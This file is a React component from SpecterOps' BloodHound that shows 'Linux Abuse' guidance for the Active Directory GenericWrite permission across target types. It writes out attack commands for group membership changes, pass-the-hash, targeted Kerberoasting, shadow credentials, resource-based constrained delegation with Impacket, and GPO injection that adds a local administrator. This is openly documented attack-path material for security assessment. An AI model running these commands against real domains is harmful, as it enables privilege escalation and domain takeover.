// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps> = ({ targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite to a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in
                        cleartext or prompted interactively if omitted from the command line:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/targetedKerberoast'>
                            targetedKerberoast.py
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
                    </Typography>

                    <Typography variant='body2'>
                        The tool will automatically attempt a targetedKerberoast attack, either on all users or against
                        a specific one if specified in the command line, and then obtain a crackable hash. The cleanup
                        is done automatically as well.
                    </Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'Computer':
            return (
                <>
                    <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                    <Typography variant='body2'>
                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                        computer account can be added with Impacket's addcomputer.py example script:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        We now need to configure the target object so that the attacker-controlled computer can delegate
                        to it. Impacket's rbcd.py script can be used for that purpose:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
                        "admin" for. Impacket's getST.py example script can be used for that purpose.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                        the TARGETCOMPUTER.
                    </Typography>
                    <Typography variant='body1'> Shadow Credentials attack </Typography>
                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite over a GPO, you may make modifications to that GPO in order to inject malicious configurations into it. 
                        You could for instance add a Scheduled Task that will then be executed by all of the computers and/or users to which the GPO applies, 
                        thus compromising them. Note that some configurations (such as Scheduled Tasks) implement item-level targeting, allowing 
                        to precisely target a specific object.
                        GPOs are applied every 90 minutes for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain controllers.
                        See the references tab for a more detailed write up on this abuse.
                    </Typography>

                    <Typography variant='body2'>
                        The <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool can be used to perform the attack from a Linux machine. First, define a module file that describes the configuration to inject. 
                        The following one defines a computer configuration, with an immediate Scheduled Task adding a domain user as local administrator. 
                        A filter is defined, so that it only applies to a specific target.
                    </Typography>

                    <Typography component={'pre'}>
                            {
                                '[MODULECONFIG]\n' +
                                'name = Scheduled Tasks\n' +
                                'type = computer\n' +
                                '\n' +
                                '[MODULEOPTIONS]\n' +
                                'task_type = immediate\n' +
                                'program = cmd.exe\n' +
                                'arguments = /c "net localgroup Administrators corp.com\john /add"\n' +
                                '\n' +
                                '[MODULEFILTERS]\n' +
                                'filters = [{ "operator": "AND", "type": "Computer Name", "value": "srv1.corp.com"}]'
                            }
                    </Typography>

                     <Typography variant='body2'>
                        Place the described configuration into the Scheduled_task_add.ini file, and inject it into the target GPO with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                     </Typography>

                    <Typography variant='body2'>
                        Alternatively, <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Hackndo/pyGPOAbuse'>
                             pyGPOAbuse.py 
                        </Link>{' '}
                         can be used for that purpose.
                    </Typography>
                    <Typography variant='body2'>
                        This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with
                        'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to
                        add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for
                        the given GPO. Therefore, you need write access to child objects of this folder or create child
                        objects permission. The security descriptor of the GPO is reflected on the folder, meaning
                        permissions to write child items on the GPO are required.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permissions over an OU, you may make modifications to the gPLink attribute of
                        the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a
                        malicious Group Policy Object (GPO) to all of the OU's child user and computer objects
                        (including the ones located in nested sub-OUs). This can be exploited to make said child items
                        execute arbitrary commands through an immediate scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target OU through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        You can then link the modified GPO to the OU, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "OU=SERVERS,DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given OU as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'Domain':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a domain object, you may make modifications to the gPLink
                        attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an
                        attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer
                        objects (including the ones located in nested OUs). This can be exploited to make said child
                        items execute arbitrary commands through e.g. an immediate scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target domain object through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        You can then link the modified GPO to the domain, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given OU as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a certificate template, you may be able to perform an ESC4
                        attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4
                        edge from the principal to the forest domain node.
                    </Typography>
                </>
            );
        case 'EnterpriseCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over an enterprise CA, you can publish certificate templates to the
                        enterprise CA by adding the CN name of the template in the enterprise CA object's
                        certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'RootCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a root CA, you can make a rogue certificate trusted as a root
                        CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute.
                        This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'NTAuthStore':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a NTAuth store, you can make an enterprise CA certificate
                        trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA
                        object's cACertificate attribute. This action may enable you to perform an ADCS domain
                        escalation.
                    </Typography>
                </>
            );
        case 'IssuancePolicy':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over an issuance policy object, you create a OID group link to a
                        targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of
                        the issuance policy object. This action may enable you to gain membership of the group through
                        an ADCS ESC13 attack.
                    </Typography>
                </>
            );
        case 'Site':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite permissions over a Site object allow modifying the gPLink attribute of the site.
                        The ability to alter the gPLink attribute of a site may allow an attacker to apply a malicious Group Policy Object
                        (GPO) to all of the objects associated with the site. This can be exploited to make said objects execute 
                        arbitrary commands e.g. through an immediate scheduled task, thus compromising them.
                        In the case of a site, the affected objects are the computers that have an IP address included in one of the site's subnets  
                        (or computers that do not belong to any site if this is the default site), as well as users connecting to these computers.
                        Note that Server objects associated with the Site should be located in the Site.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the
                        domain and to create machine accounts. Alternatively, an already compromised domain-joined
                        machine may be used to perform the attack. Note that the attack vector implementation is not
                        trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) in that GPO, and then link the GPO to the target Site through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        Now you can link the modified GPO to the Site object, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given site as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default LinuxAbuse;
